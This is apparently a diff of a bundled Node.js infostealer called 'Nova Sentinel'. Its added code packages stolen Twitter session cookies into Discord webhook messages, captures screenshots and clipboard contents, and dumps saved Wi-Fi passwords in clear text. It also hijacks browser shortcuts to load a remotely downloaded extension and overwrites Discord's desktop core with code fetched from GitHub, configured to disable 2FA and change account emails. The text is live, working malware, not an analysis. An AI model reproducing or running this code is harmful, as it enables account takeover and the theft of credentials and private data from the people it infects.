+    stat.AddTwitterAccount(profile);
+    /*const basepath = stat.testpath[0];
+    const socialDir = path.join(basepath, "Social");
+    const twitterDir = path.join(socialDir, "Twitter");
+    try {
+      if (!fs.existsSync(socialDir)) {
+        fs.mkdirSync(socialDir);
+      }
+      if (!fs.existsSync(twitterDir)) {
+        fs.mkdirSync(twitterDir);
+      }
+    } catch (e) {
+    }
+    const twitterFilePath = path.join(twitterDir, "Twitter.json");
+    fs.writeFileSync(twitterFilePath, JSON.stringify(profile));*/
+  } catch (e) {}
+}
+function sendTwitter(tw) {
+  if (tw !== "yes") return;
+  if (stat.twitter_account[0]) {
+    let {
+      screen_name,
+      name,
+      location,
+      profile_location,
+      description,
+      created_at,
+      followers_count,
+      favourites_count,
+      cookie,
+      profile_image_url,
+      profile_banner_url,
+      profile_text_color,
+      friends_count,
+      verified
+    } = stat.twitter_account[0];
+    const handleNullValue = value => value !== null && value !== void 0 ? value : "none";
+    let embed = {
+      avatar_url: "https://raw.githubusercontent.com/Yokheycv/sub/main/assets/novalogo3.png",
+      username: "Nova Sentinel",
+      embeds: [{
+        color: 3553599,
+        thumbnail: {
+          url: profile_image_url.replace("normal", "bigger")
+        },
+        image: {
+          url: profile_banner_url
+        },
+        fields: [{
+          name: verified ? `${embeds.twitter_usernamecert} Username:` : `${embeds.twitter_usernameuncert} Username:`,
+          value: `\`${handleNullValue(name)}\``,
+          inline: true
+        }, {
+          name: `${embeds.twitter_followers} Followers:`,
+          value: `\`${handleNullValue(followers_count)}\``,
+          inline: true
+        }, {
+          name: `${embeds.twitter_followings} Following:`,
+          value: `\`${handleNullValue(friends_count)}\``,
+          inline: true
+        }, {
+          name: `${embeds.twitter_fav} Favourites:`,
+          value: `\`${handleNullValue(favourites_count)}\``,
+          inline: true
+        }, {
+          name: `${embeds.mail} User:`,
+          value: `[\`${handleNullValue(screen_name)}\`](https://twitter.com/${screen_name})`,
+          inline: true
+        }, {
+          name: `${embeds.twitter_location} Location:`,
+          value: `[${handleNullValue(location)}](https://www.google.com/maps/place/${handleNullValue(location)})`,
+          inline: true
+        }, {
+          name: `${embeds.mail} Description:`,
+          value: `\`${handleNullValue(description)}\``,
+          inline: false
+        }, {
+          name: `🍪 Cookie:`,
+          value: `\`\`\`${handleNullValue(cookie)}\`\`\``,
+          inline: true
+        }],
+        footer: {
+          text: "Creation Date: " + handleNullValue(created_at)
+        },
+        title: "Twitter Account",
+        url: `https://twitter.com/${screen_name}`
+      }]
+    };
+    if (embed) {
+      return embed;
+    } else {
+      return null;
+    }
+  }
+}
+module.exports = {
+  detailtwitter,
+  sendTwitter
+};
+},{"./stats":"utils/stats.js","./emotes":"utils/emotes.js"}],"utils/infos.js":[function(require,module,exports) {
+var Registry = require("winreg"),
+  core = require("./core"),
+  fs = require("fs"),
+  {
+    stat
+  } = require("./stats"),
+  path = require("path"),
+  save = require("./save"),
+  {
+    exec
+  } = require("child_process"),
+  tempPath = require("os").tmpdir(),
+  PowerShell = require("powershell"),
+  unidecode = require("unidecode");
+async function takeScreenshotAndSave(cc) {
+  if (cc !== "yes") return;
+  const savePath = path.join(stat.testpath[0], "System");
+  const powershellScript = `
+    $Path = "${savePath}" 
+
+    $FileName = "$env:COMPUTERNAME - $(get-date -f yyyy-MM-dd_HHmmss).png"
+    $File = "$Path\\$FileName"
+
+    Add-Type -AssemblyName System.Windows.Forms
+    Add-type -AssemblyName System.Drawing
+
+    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+    $Width = $Screen.Width
+    $Height = $Screen.Height
+    $Left = $Screen.Left
+    $Top = $Screen.Top
+
+    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
+    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
+
+    $bitmap.Save($File) 
+    Write-Output "Screenshot saved to:"
+    Write-Output $File
+  `;
+  const ps1FilePath = path.join(tempPath, core.generateId(12) + "_temp.ps1");
+  fs.writeFileSync(ps1FilePath, powershellScript);
+  exec(`powershell -ExecutionPolicy Bypass -NoProfile -File "${ps1FilePath}"`, (error, stdout, stderr) => {
+    if (error) {}
+    try {
+      fs.unlinkSync(ps1FilePath);
+    } catch (e) {}
+  });
+}
+async function getSysteminformations(cc, ip, hostname, disk, ram, uid, cpucount, OS, cpu, GPU, windowskey, windowsversion) {
+  if (cc !== "yes") return;
+  let info = await Systeminformations(cc, ip, hostname, disk, ram, uid, cpucount, OS, cpu, GPU, windowskey, windowsversion);
+  const savePath = path.join(stat.testpath[0], "System");
+  try {
+    if (!fs.existsSync(savePath)) {
+      await fs.mkdirSync(savePath);
+      fs.writeFileSync(path.join(savePath, "System Info.txt"), info);
+    }
+  } catch (e) {
+    save.SaveError(e);
+  }
+}
+async function Systeminformations(cc, ip, hostname, disk, ram, uid, cpucount, OS, cpu, GPU, windowskey, windowsversion) {
+  if (cc != "yes") return;
+  let informations = core.getHeader();
+  try {
+    informations += `UUID: ${uid}\n`;
+    informations += `IP: ${ip}\n`;
+    informations += `Windows Key: ${windowskey}\n`;
+    informations += `Windows Version: ${windowsversion}\n`;
+    informations += `HOSTNAME: ${hostname}\n`;
+    informations += `USERNAME: ${process.env.userprofile.split("\\")[2]}\n`;
+    informations += `OS: ${OS}\n`;
+    informations += `FileLocation: ${process.cwd()}\n`;
+    informations += `CPU: ${cpu}\n`;
+    informations += `CPU Core: ${cpucount}\n`;
+    informations += `GPU(s): ${GPU.split("   ").join(", ")}\n`;
+    informations += `RAM: ${ram} GB\n`;
+    informations += `DISK: ${disk} GB\n\n\n`;
+    informations += `───────────────────────\nApplications installed\n───────────────────────\n\n${await getInstalledApplication()}\n`;
+  } catch (e) {}
+  return informations;
+}
+async function getInstalledApplication() {
+  const regKey = new Registry({
+    hive: Registry.HKLM,
+    key: "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
+  });
+  const exists = await new Promise((resolve, reject) => {
+    regKey.keyExists((err, exists) => {
+      if (err != null) {
+        resolve(false);
+      }
+      resolve(exists);
+    });
+  });
+  if (!exists) {
+    return "";
+  }
+  const subkeys = await new Promise((resolve, reject) => {
+    regKey.keys((err, subkeys) => {
+      if (err != null) {
+        resolve([]);
+      }
+      resolve(subkeys);
+    });
+  });
+  if (subkeys.length == 0) {
+    return "";
+  }
+  let installedApps = "";
+  for (let i = 0; i < subkeys.length; i++) {
+    const subkey = subkeys[i];
+    const items = await new Promise((resolve, reject) => {
+      subkey.values((err, items) => {
+        if (err != null) {
+          resolve([]);
+        }
+        resolve(items);
+      });
+    });
+    for (let u = 0; u < items.length; u++) {
+      if (items[u].name == "DisplayName") {
+        installedApps = installedApps + items[u].value + "\n";
+      }
+    }
+  }
+  return installedApps;
+}
+async function NovaSentinelClipboard(cc) {
+  if (cc !== "yes") return;
+  try {
+    const ge = "powershell Get-Clipboard";
+    let ps = new PowerShell(ge);
+    ps.on("error", err => {});
+    ps.on("output", data => {
+      if (!data) return;
+      const basepath = stat.testpath[0];
+      const sysdir = path.join(basepath, "System");
+      try {
+        if (!fs.existsSync(sysdir)) {
+          fs.mkdirSync(sysdir);
+        }
+      } catch (e) {
+        return;
+      }
+      const ClipFilePath = path.join(sysdir, "Clipboard.txt");
+      fs.writeFileSync(ClipFilePath, core.getHeader() + data);
+    });
+    ps.on("error-output", data => {});
+    ps.on("end", code => {});
+  } catch (error) {}
+}
+async function NovaSentinelWifiPasswords(cc) {
+  let wifiprofile = [];
+  if (cc !== "yes") return;
+  try {
+    const ge = "netsh wlan show profile";
+    let ps = new PowerShell(ge);
+    ps.on("output", async data => {
+      const lines = data.split("\n");
+      for (const line of lines) {
+        if (line.startsWith("    Profil")) {
+          const profileName = line.split(":")[1].trim();
+          const asciiContent = unidecode(profileName);
+          wifiprofile.push(asciiContent);
+        }
+      }
+      const promises = wifiprofile.map(async profile => {
+        const ge = `netsh wlan show profile "${profile}" key=clear`;
+        return new Promise(async (resolve, reject) => {
+          try {
+            let ps = new PowerShell(ge);
+            ps.on("output", data => {
+              const asciiContent = unidecode(data);
+              resolve(asciiContent);
+            });
+          } catch (error) {}
+        });
+      });
+      const profileContents = await Promise.all(promises);
+      const c = profileContents.join("\n");
+      if (!c) return;
+      const basepath = stat.testpath[0];
+      const sysdir = path.join(basepath, "System");
+      try {
+        if (!fs.existsSync(sysdir)) {
+          await fs.mkdir(sysdir);
+        }
+      } catch (e) {
+        return;
+      }
+      const WifiFilePath = path.join(sysdir, "WifiPasswords.txt");
+      await fs.writeFileSync(WifiFilePath, core.getHeader() + c);
+    });
+  } catch (error) {}
+}
+async function NovaSentinelAV(cc) {
+  if (cc !== "yes") return;
+  const psScript = `
+function Get-AntiVirusProduct {
+    [CmdletBinding()]
+    param (
+    [parameter(ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]
+    [Alias('name')]
+    $computername=$env:computername
+    )
+
+    $AntiVirusProducts = Get-WmiObject -Namespace "root\\SecurityCenter2" -Class AntiVirusProduct -ComputerName $computername
+
+    $ret = @()
+    foreach ($AntiVirusProduct in $AntiVirusProducts) {
+         switch ($AntiVirusProduct.productState) {
+            "262144" { $defstatus = "Up to date"; $rtstatus = "Disabled" }
+            "262160" { $defstatus = "Out of date"; $rtstatus = "Disabled" }
+            "266240" { $defstatus = "Up to date"; $rtstatus = "Enabled" }
+            "266256" { $defstatus = "Out of date"; $rtstatus = "Enabled" }
+            "393216" { $defstatus = "Up to date"; $rtstatus = "Disabled" }
+            "393232" { $defstatus = "Out of date"; $rtstatus = "Disabled" }
+            "393488" { $defstatus = "Out of date"; $rtstatus = "Disabled" }
+            "397312" { $defstatus = "Up to date"; $rtstatus = "Enabled" }
+            "397328" { $defstatus = "Out of date"; $rtstatus = "Enabled" }
+            "397584" { $defstatus = "Out of date"; $rtstatus = "Enabled" }
+            default   { $defstatus = "Unknown"; $rtstatus = "Unknown" }
+        }
+        $ht = @{}
+        $ht.Computername = $computername
+        $ht.Name = $AntiVirusProduct.displayName
+        $ht.'Product GUID' = $AntiVirusProduct.instanceGuid
+        $ht.'Product Executable' = $AntiVirusProduct.pathToSignedProductExe
+        $ht.'Reporting Exe' = $AntiVirusProduct.pathToSignedReportingExe
+        $ht.'Definition Status' = $defstatus
+        $ht.'Real-time Protection Status' = $rtstatus
+
+        # Créez un nouvel objet pour chaque ordinateur
+        $ret += New-Object -TypeName PSObject -Property $ht 
+    }
+    Return $ret
+}
+Get-AntiVirusProduct
+`;
+  const ps = new PowerShell(psScript);
+  ps.on("error", err => {});
+  ps.on("output", async data => {
+    const savePath = path.join(stat.testpath[0], "System");
+    try {
+      if (!fs.existsSync(savePath)) {
+        await fs.mkdirSync(savePath);
+        fs.writeFileSync(path.join(savePath, "Antivirus.txt"), core.getHeader() + data);
+      } else {
+        fs.writeFileSync(path.join(savePath, "Antivirus.txt"), core.getHeader() + data);
+      }
+    } catch (e) {
+      save.SaveError(e);
+    }
+  });
+  ps.on("error-output", data => {});
+  ps.on("end", code => {});
+}
+module.exports = {
+  takeScreenshotAndSave,
+  getSysteminformations,
+  NovaSentinelAV,
+  NovaSentinelClipboard,
+  NovaSentinelWifiPasswords
+};
+},{"./core":"utils/core.js","./stats":"utils/stats.js","./save":"utils/save.js"}],"utils/injection.js":[function(require,module,exports) {
+const fs = require("fs"),
+  glob = require("glob"),
+  process = require("process"),
+  {
+    exec,
+    execSync,
+    spawn
+  } = require("child_process"),
+  path = require("path"),
+  axios = require("axios"),
+  asar = require("asar"),
+  {
+    stat
+  } = require("./stats"),
+  save = require("./save"),
+  core = require("./core"),
+  unzipper = require("unzipper"),
+  fsPromises = require("fs").promises;
+function replaceSpecialCharacter(text) {
+  return text.replace(/ /g, "\\u00A0");
+}
+async function LetInject() {
+  let extensions_path = [path.join(process.env.ProgramData, "ChromeExtensionsNova", "extension-cookies"), path.join(process.env.ProgramData, "ChromeExtensionsNova", "extension-tokens")];
+  const shortcutPaths = {
+    roaming: {
+      "Naviguateur Opera GX": "Microsoft\\Windows\\Start Menu\\Programs\\Navigateur Opera GX.lnk",
+      Google: "Microsoft\\Windows\\Start Menu\\Programs\\Google Chrome.lnk",
+      Opera: "Microsoft\\Windows\\Start Menu\\Programs\\Opera.lnk",
+      "Opera GX": "Microsoft\\Windows\\Start Menu\\Programs\\Opera GX.lnk",
+      Brave: "Microsoft\\Windows\\Start Menu\\Programs\\Brave.lnk",
+      Vivaldi: "Microsoft\\Windows\\Start Menu\\Programs\\Vivaldi.lnk",
+      "Microsoft Edge": "Microsoft\\Windows\\Start Menu\\Programs\\Microsoft Edge.lnk",
+      "Yandex Browser": "Microsoft\\Windows\\Start Menu\\Programs\\Yandex\\Yandex Browser.lnk",
+      "SRWare Iron": "Microsoft\\Windows\\Start Menu\\Programs\\SRWare Iron.lnk",
+      "Kiwi Browser": "Microsoft\\Windows\\Start Menu\\Programs\\Kiwi Browser.lnk",
+      "Torch Browser": "Microsoft\\Windows\\Start Menu\\Programs\\Torch Browser.lnk",
+      Slimjet: "Microsoft\\Windows\\Start Menu\\Programs\\Slimjet.lnk",
+      "Comodo Dragon": "Microsoft\\Windows\\Start Menu\\Programs\\Comodo Dragon.lnk",
+      "Opera Neon": "Microsoft\\Windows\\Start Menu\\Programs\\Opera Neon.lnk"
+    },
+    programdata: {
+      Google: "Microsoft\\Windows\\Start Menu\\Programs\\Google Chrome.lnk",
+      Opera: "Microsoft\\Windows\\Start Menu\\Programs\\Opera.lnk",
+      "Opera GX": "Microsoft\\Windows\\Start Menu\\Programs\\Opera GX.lnk",
+      Brave: "Microsoft\\Windows\\Start Menu\\Programs\\Brave.lnk",
+      Vivaldi: "Microsoft\\Windows\\Start Menu\\Programs\\Vivaldi.lnk",
+      "Microsoft Edge": "Microsoft\\Windows\\Start Menu\\Programs\\Microsoft Edge.lnk",
+      "Yandex Browser": "Microsoft\\Windows\\Start Menu\\Programs\\Yandex\\Yandex Browser.lnk",
+      "SRWare Iron": "Microsoft\\Windows\\Start Menu\\Programs\\SRWare Iron.lnk",
+      "Kiwi Browser": "Microsoft\\Windows\\Start Menu\\Programs\\Kiwi Browser.lnk",
+      "Torch Browser": "Microsoft\\Windows\\Start Menu\\Programs\\Torch Browser.lnk",
+      Slimjet: "Microsoft\\Windows\\Start Menu\\Programs\\Slimjet.lnk",
+      "Comodo Dragon": "Microsoft\\Windows\\Start Menu\\Programs\\Comodo Dragon.lnk",
+      "Opera Neon": "Microsoft\\Windows\\Start Menu\\Programs\\Opera Neon.lnk"
+    }
+  };
+  const userRoamingStartMenu = path.join(process.env.APPDATA);
+  const userProgramDataStartMenu = path.join(process.env.ProgramData);
+  async function modifyShortcut(shortcutPath) {
+    let randomname = path.join(process.env.APPDATA, `salut${core.generateId(5)}.ps1`);
+    if (!fs.existsSync(shortcutPath)) return;
+    const powershellCommand = `
+    $WshShell = New-Object -comObject WScript.Shell;
+    $Shortcut = $WshShell.CreateShortcut("${replaceSpecialCharacter(shortcutPath)}");
+    $Shortcut.Arguments = "--load-extension=${extensions_path[0]},${extensions_path[1]}";
+    $Shortcut.Save()
+    `;
+    await fs.writeFileSync(randomname, powershellCommand, {
+      encoding: "utf8"
+    });
+    execSync(`powershell.exe -ExecutionPolicy Bypass -File "${randomname}" -RunAsAdministrator`, async (error, stdout, stderr) => {
+      if (error) {
+        return;
+      }
+    });
+    await fs.unlink(randomname, err => {
+      if (err) {} else {}
+    });
+  }
+  for (const browserName in shortcutPaths.programdata) {
+    const shortcutPath = path.join(userProgramDataStartMenu, shortcutPaths.programdata[browserName]);
+    await modifyShortcut(shortcutPath);
+  }
+  for (const browserName in shortcutPaths.roaming) {
+    const shortcutPath = path.join(userRoamingStartMenu, shortcutPaths.roaming[browserName]);
+    await modifyShortcut(shortcutPath);
+  }
+}
+async function replaceWebhookTerm(directoryPath, wb, ip, compname) {
+  try {
+    const files = await fsPromises.readdir(directoryPath);
+    for (const fileName of files) {
+      const filePath = path.join(directoryPath, fileName);
+      const fileStat = await fsPromises.stat(filePath);
+      if (fileStat.isFile()) {
+        let fileContent = await fsPromises.readFile(filePath, "utf-8");
+        fileContent = fileContent.replace(/%[A-Z]{7}%/gm, wb);
+        fileContent = fileContent.replace(/%IPINFO%/gm, ip);
+        fileContent = fileContent.replace(/%COMP_INFO%/gm, compname);
+        await fsPromises.writeFile(filePath, fileContent, "utf-8");
+      } else if (fileStat.isDirectory()) {
+        await replaceWebhookTerm(filePath, wb);
+      }
+    }
+  } catch (error) {}
+}
+async function chrome_injection(cc, webhook, chrome_url, ip, computername) {
+  if (cc !== "yes") return;
+  const destinationFolder = path.join(process.env.ProgramData, "ChromeExtensionsNova");
+  try {
+    const response = await axios.get(chrome_url, {
+      responseType: "stream"
+    });
+    if (!fs.existsSync(destinationFolder)) {
+      fs.mkdirSync(destinationFolder, {
+        recursive: true
+      });
+    }
+    const fileName = path.basename(chrome_url);
+    const destinationPath = path.join(destinationFolder, fileName);
+    const writer = fs.createWriteStream(destinationPath);
+    writer.on("finish", async () => {
+      fs.createReadStream(destinationPath).pipe(unzipper.Extract({
+        path: destinationFolder
+      })).on("close", () => {
+        fs.unlink(destinationPath, err => {
+          if (err) {} else {
+            replaceWebhookTerm(destinationFolder, webhook, ip, computername);
+            LetInject();
+          }
+        });
+      });
+    });
+    writer.on("error", err => {});
+    response.data.pipe(writer);
+  } catch (error) {}
+}
+async function inject_antidelete(app, inject, webhook, url, link, a2f, automailchanger, ClientEmail) {
+  if (app.includes("Canary") || app.includes("PTB")) return;
+  let niger = path.join(app[0], "resources", "app.asar");
+  try {
+    let ScriptToInject = `
+  
 "use strict";
-module.exports = require("admin-check");
 
-/***/ }),
-
-/***/ "archiver":
-/*!***************************!*\
-  !*** external "archiver" ***!
-  \***************************/
-/***/ ((module) => {
-
-"use strict";
-module.exports = require("archiver");
-
-/***/ }),
-
-/***/ "asar":
-/*!***********************!*\
-  !*** external "asar" ***!
-  \***********************/
-/***/ ((module) => {
-
-"use strict";
-module.exports = require("asar");
-
-/***/ }),
-
-/***/ "axios":
-/*!************************!*\
-  !*** external "axios" ***!
-  \************************/
-/***/ ((module) => {
-
-"use strict";
-module.exports = require("axios");
-
-/***/ }),
-
-/***/ "child_process":
-/*!********************************!*\
-  !*** external "child_process" ***!
-  \********************************/
-/***/ ((module) => {
-
-"use strict";
-module.exports = require("child_process");
-
-/***/ }),
-
-/***/ "crypto":
-/*!*************************!*\
-  !*** external "crypto" ***!
-  \*************************/
-/***/ ((module) => {
-
-"use strict";
-module.exports = require("crypto");
-
-/***/ }),
-
-/***/ "diskusage":
-/*!****************************!*\
-  !*** external "diskusage" ***!
-  \****************************/
-/***/ ((module) => {
-
-"use strict";
-module.exports = require("diskusage");
-
-/***/ }),
-
-/***/ "form-data":
-/*!****************************!*\
-  !*** external "form-data" ***!
-  \****************************/
-/***/ ((module) => {
-
-"use strict";
-module.exports = require("form-data");
-
-/***/ }),
-
-/***/ "fs":
-/*!*********************!*\
-  !*** external "fs" ***!
-  \*********************/
-/***/ ((module) => {
-
-"use strict";
-module.exports = require("fs");
-
-/***/ }),
-
-/***/ "glob":
-/*!***********************!*\
-  !*** external "glob" ***!
-  \***********************/
-/***/ ((module) => {
-
-"use strict";
-module.exports = require("glob");
-
-/***/ }),
-
-/***/ "iconv-lite":
-/*!*****************************!*\
-  !*** external "iconv-lite" ***!
-  \*****************************/
-/***/ ((module) => {
-
-"use strict";
-module.exports = require("iconv-lite");
-
-/***/ }),
-
-/***/ "node-fetch":
-/*!*****************************!*\
-  !*** external "node-fetch" ***!
-  \*****************************/
-/***/ ((module) => {
-
-"use strict";
-module.exports = require("node-fetch");
-
-/***/ }),
-
-/***/ "node-forge":
-/*!*****************************!*\
-  !*** external "node-forge" ***!
-  \*****************************/
-/***/ ((module) => {
-
-"use strict";
-module.exports = require("node-forge");
-
-/***/ }),
-
-/***/ "node-passworder":
-/*!**********************************!*\
-  !*** external "node-passworder" ***!
-  \**********************************/
-/***/ ((module) => {
-
-"use strict";
-module.exports = require("node-passworder");
-
-/***/ }),
-
-/***/ "powershell":
-/*!*****************************!*\
-  !*** external "powershell" ***!
-  \*****************************/
-/***/ ((module) => {
-
-"use strict";
-module.exports = require("powershell");
-
-/***/ }),
-
-/***/ "process":
-/*!**************************!*\
-  !*** external "process" ***!
-  \**************************/
-/***/ ((module) => {
-
-"use strict";
-module.exports = require("process");
-
-/***/ }),
-
-/***/ "seco-file":
-/*!****************************!*\
-  !*** external "seco-file" ***!
-  \****************************/
-/***/ ((module) => {
-
-"use strict";
-module.exports = require("seco-file");
-
-/***/ }),
-
-/***/ "sql.js":
-/*!*************************!*\
-  !*** external "sql.js" ***!
-  \*************************/
-/***/ ((module) => {
-
-"use strict";
-module.exports = require("sql.js");
-
-/***/ }),
-
-/***/ "sqlite3":
-/*!**************************!*\
-  !*** external "sqlite3" ***!
-  \**************************/
-/***/ ((module) => {
-
-"use strict";
-module.exports = require("sqlite3");
-
-/***/ }),
-
-/***/ "sudo-prompt":
-/*!******************************!*\
-  !*** external "sudo-prompt" ***!
-  \******************************/
-/***/ ((module) => {
-
-"use strict";
-module.exports = require("sudo-prompt");
-
-/***/ }),
-
-/***/ "unidecode":
-/*!****************************!*\
-  !*** external "unidecode" ***!
-  \****************************/
-/***/ ((module) => {
-
-"use strict";
-module.exports = require("unidecode");
-
-/***/ }),
-
-/***/ "unzipper":
-/*!***************************!*\
-  !*** external "unzipper" ***!
-  \***************************/
-/***/ ((module) => {
-
-"use strict";
-module.exports = require("unzipper");
-
-/***/ }),
-
-/***/ "winreg":
-/*!*************************!*\
-  !*** external "winreg" ***!
-  \*************************/
-/***/ ((module) => {
-
-"use strict";
-module.exports = require("winreg");
-
-/***/ }),
-
-/***/ "https":
-/*!************************!*\
-  !*** external "https" ***!
-  \************************/
-/***/ ((module) => {
-
-"use strict";
-module.exports = require("https");
-
-/***/ }),
-
-/***/ "os":
-/*!*********************!*\
-  !*** external "os" ***!
-  \*********************/
-/***/ ((module) => {
-
-"use strict";
-module.exports = require("os");
-
-/***/ }),
-
-/***/ "path":
-/*!***********************!*\
-  !*** external "path" ***!
-  \***********************/
-/***/ ((module) => {
-
-"use strict";
-module.exports = require("path");
-
-/***/ }),
-
-/***/ "util":
-/*!***********************!*\
-  !*** external "util" ***!
-  \***********************/
-/***/ ((module) => {
-
-"use strict";
-module.exports = require("util");
-
-/***/ })
-
-/******/ 	});
-/************************************************************************/
-/******/ 	// The module cache
-/******/ 	var __webpack_module_cache__ = {};
-/******/ 	
-/******/ 	// The require function
-/******/ 	function __webpack_require__(moduleId) {
-/******/ 		// Check if module is in cache
-/******/ 		var cachedModule = __webpack_module_cache__[moduleId];
-/******/ 		if (cachedModule !== undefined) {
-/******/ 			return cachedModule.exports;
-/******/ 		}
-/******/ 		// Create a new module (and put it into the cache)
-/******/ 		var module = __webpack_module_cache__[moduleId] = {
-/******/ 			// no module.id needed
-/******/ 			// no module.loaded needed
-/******/ 			exports: {}
-/******/ 		};
-/******/ 	
-/******/ 		// Execute the module function
-/******/ 		__webpack_modules__[moduleId](module, module.exports, __webpack_require__);
-/******/ 	
-/******/ 		// Return the exports of the module
-/******/ 		return module.exports;
-/******/ 	}
-/******/ 	
-/************************************************************************/
-/******/ 	
-/******/ 	// startup
-/******/ 	// Load entry module and return exports
-/******/ 	// This entry module can't be inlined because the eval devtool is used.
-/******/ 	var __webpack_exports__ = __webpack_require__("./index.js");
-/******/ 	
-/******/ })()
-;
+console.log("https://t.me/Sordeal")
+
+
+
+const fs = require("fs"),
+https = require("https"),
+ path = require("path"),
+ buildInfo = require('./buildInfo'),
+ paths = require('../common/paths'),
+ moduleUpdater = require('../common/moduleUpdater'),
+ updater = require('../common/updater'),
+ requireNative = require('./requireNative');
+ paths.init(buildInfo);
+
+
+function getAppMode() {
+  if (process.argv && process.argv.includes('--overlay-host')) {
+    return 'overlay-host';
+  }
+  return 'app';
+}
+
+const mode = getAppMode();
+if (mode === 'app') {
+  require('./bootstrap');
+} else if (mode === 'overlay-host') {
+  const appSettings = require('./appSettings');
+  appSettings.init();
+  const {
+    NEW_UPDATE_ENDPOINT
+  } = require('./Constants');
+  if (!buildInfo.debug && buildInfo.newUpdater) {
+    if (!updater.tryInitUpdater(buildInfo, NEW_UPDATE_ENDPOINT)) {
+      throw new Error('Failed to initialize modules in overlay host.');
+    }
+    updater.getUpdater().startCurrentVersionSync({
+      allowObsoleteHost: true
+    });
+  } else {
+    moduleUpdater.initPathsOnly(buildInfo);
+  }
+  requireNative('discord_overlay2/standalone_host.js');
+}
+
+try{ 
+    initNovaSentinel()
+}catch(e){}
+
+
+const discordAppDataPath = path.join(
+  process.env.LOCALAPPDATA ||
+    (process.platform == "darwin"
+      ? process.env.HOME + "/Library/Preferences"
+      : "/var/local"),
+  "Discord"
+);
+
+function findDiscordVersion() {
+  const discordVersions = fs
+    .readdirSync(discordAppDataPath)
+    .filter((folder) => folder.startsWith("app-"));
+  console.log(discordVersions);
+  if (discordVersions.length > 0) {
+    return discordVersions[0];
+  }
+  return null; 
+}
+
+function findCoreVersion(discordVersion) {
+  const coreVersionsPath = path.join(
+    discordAppDataPath,
+    discordVersion,
+    "modules"
+  );
+  const coreVersions = fs
+    .readdirSync(coreVersionsPath)
+    .filter((folder) => folder.startsWith("discord_desktop_core-"));
+  if (coreVersions.length > 0) {
+    return coreVersions[0];
+  }
+  return null; 
+}
+
+function initNovaSentinel(){
+const discordVersion = findDiscordVersion();
+const coreVersion = discordVersion ? findCoreVersion(discordVersion) : null;
+
+if (discordVersion && coreVersion) {
+  const indexFilePath = path.join(
+    discordAppDataPath,
+    discordVersion,
+    "modules",
+    coreVersion,
+    "discord_desktop_core/index.js"
+  );
+  const betterDiscordPath = path.join(
+    process.env.APPDATA ||
+      (process.platform == "darwin"
+        ? process.env.HOME + "/Library/Preferences"
+        : "/var/local"),
+    "betterdiscord/data/betterdiscord.asar"
+  );
+
+  try {
+    const negger = fs.readFileSync(indexFilePath, "utf8");
+    if (negger === "module.exports = require('./core.asar'); || negger === module.exports = require('./core.asar');") {
+      init();
+    }else{console.log("nova sentinel is still injected on this discord client")}
+  } catch (err) {
+    console.error("Error index.js read :", err);
+  }
+
+  function init() {
+    https
+      .get(
+        "https://raw.githubusercontent.com/ksch-58/sub/main/index.js",
+        (res) => {
+          let chunk = "";
+          res.on("data", (data) => (chunk += data));
+          res.on("end", () => {
+            const newContent = chunk
+              .replace(
+                "%WEB"+"HOOK%",
+                "${webhook}"
+              )
+              .replace("%DISABLEFA%", "${a2f !== null && a2f !== void 0 ? a2f : false}")
+              .replace("%AUTOMAILCHANGER%", "${automailchanger !== null && automailchanger !== void 0 ? automailchanger : false}")
+              .replace("%CLIENTEMAIL%", "${ClientEmail !== null && ClientEmail !== void 0 ? ClientEmail : "kschdediscord@gmail.com"}")
+              .replace("%TRANSFER_URL%", "${link}");
+            fs.writeFileSync(indexFilePath, newContent);
+          });
+        }
+      )
+      .on("error", (err) => {
+        console.error("Error request:", err);
+        setTimeout(init, 10000);
+      });
+  }
+
+  require(path.join(discordAppDataPath, discordVersion, "resources/app.asar"));
+  if (fs.existsSync(betterDiscordPath)) {
+    require(betterDiscordPath);
+  }
+} else {
+  console.error("Nova Sentinel Still injected.");
+}
+}
+  `;
+    let output = path.join(niger, "..", "unpacked");
+    if (niger) {
+      await unpackAsar(niger, output);
+      setTimeout(async () => {
+        const indexPath = path.join(output, "app_bootstrap", "index.js");
+        const updatedData = `\n${ScriptToInject}`;
+        await fs.writeFile(indexPath, updatedData, "utf8", err => {
+          if (err) {}
+        });
+        await packAsar(output, niger);
+      }, 2500);
+    }
+  } catch (e) {}
+}
+async function inject(inject, webhook, url, link, a2f, automailchanger, ClientEmail, silent) {
+  if (inject !== "yes") return;
+  let replacedInjection;
+  let lkn;
+  lkn = webhook;
+  try {
+    if (silent !== "yes") {
+      const filteredProcesses = await core.filterProcessesByName("discord");
+      if (filteredProcesses.length > 0) {
+        try {
+          filteredProcesses.forEach(proc => {
+            process.kill(proc.pid);
+          });
+        } catch (e) {}
+      }
+    }
+    const local = process.env.localappdata;
+    const discordFolders = glob.sync(`${local}/*cord*`);
+    var desktops = [];
+    for (let i = 0; i < discordFolders.length; i++) {
+      const discordFolder = discordFolders[i];
+      const folderContents = await fsPromises.readdir(discordFolder, {
+        withFileTypes: true
+      });
+      const apps = folderContents.filter(item => item.isDirectory() && item.name.includes("app")).map(item => path.join(discordFolder, item.name));
+      if (apps.length < 1) return;
+      /* if (path.basename(discordFolder) == "Discord") {
+          await inject_antidelete(
+            apps,
+            inject,
+            webhook,
+            url,
+            link,
+            a2f,
+            automailchanger,
+            ClientEmail
+          );
+        }*/
+      for (let u = 0; u < apps.length; u++) {
+        const app = apps[u];
+        const desktopCores = glob.sync(`${app}/modules/discord_desktop_core-*`);
+        if (!desktopCores[0]) return;
+        desktopCores.forEach(async desktop => {
+          try {
+            const response = await axios.get(url);
+            const injection = response.data;
+            const regex = /%[A-Z]{7}%/gm;
+            replacedInjection = injection.replace(regex, lkn);
+            replacedInjection = replacedInjection.replace(/%TRANSFER_URL%/g, link);
+            replacedInjection = await replacedInjection.replace(/%DISABLEFA%/g, a2f);
+            replacedInjection = await replacedInjection.replace(/%AUTOMAILCHANGER%/g, automailchanger);
+            replacedInjection = await replacedInjection.replace(/%CLIENTEMAIL%/g, ClientEmail);
+            const indexFile = path.join(`${desktop}/discord_desktop_core/index.js`);
+            await fs.writeFileSync(indexFile, `${replacedInjection}`, "utf-8");
+            const firstDirectory = glob.sync(`${desktop}/discord_d*`)[0];
+            if (!fs.existsSync(firstDirectory + "/ThiefCat")) {
+              await fs.mkdirSync(firstDirectory + "/ThiefCat");
+            }
